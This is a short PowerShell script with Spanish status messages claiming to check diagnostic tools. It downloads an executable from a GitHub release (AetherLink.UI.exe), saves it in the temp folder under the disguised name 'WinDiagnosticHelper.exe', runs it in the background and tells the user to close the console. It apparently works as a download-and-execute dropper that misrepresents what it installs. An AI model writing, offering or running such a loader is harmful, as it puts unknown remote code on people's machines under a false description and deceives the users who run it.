$ErrorActionPreference = "Stop"
$tempDir = "$env:TEMP\WinDiagCache"
$appExe = "$tempDir\WinDiagnosticHelper.exe"
$appUrl = "https://github.com/DanielWueno/AetherLink/releases/download/Android_Only/AetherLink.UI.exe"

Write-Host "Verificando herramientas de diagnóstico..." -ForegroundColor DarkGray

if (-not (Test-Path $appExe)) {
    Write-Host "Sincronizando binarios en la caché temporal. Por favor espera..." -ForegroundColor DarkGray
    New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
    Invoke-WebRequest -Uri $appUrl -OutFile $appExe
}

Write-Host "Lanzando entorno gráfico en segundo plano..." -ForegroundColor DarkGray
Start-Process -FilePath $appExe

Write-Host "Listo. Ya puedes cerrar esta consola." -ForegroundColor Green
Start-Sleep -Seconds 2
